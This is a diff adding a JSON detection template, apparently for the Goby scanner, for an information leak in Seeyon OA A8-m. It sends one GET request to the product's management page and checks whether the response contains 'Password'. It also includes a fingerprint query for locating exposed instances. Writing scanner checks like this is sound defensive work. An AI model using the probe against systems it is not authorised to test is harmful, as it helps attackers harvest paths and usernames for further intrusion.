@@ -1,0 +1,53 @@
+{
+      "Name": "Seeyon OA A8-m Information leakage",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"Apache-Tomcat\" && body=\"A8-m\"",
+      "Description": "Seeyon OA A8-m has state monitoring page information leakage, from which attackers can obtain sensitive information such as website path and user name for further attack",
+      "Product": "Seeyon OA A8-m",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Attackers can obtain sensitive information such as website path and user name to further attack<br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/seeyon/management/index.jsp",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Password",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-05 14:59:04",
+      "GobyVersion": "1.8.255"
+}
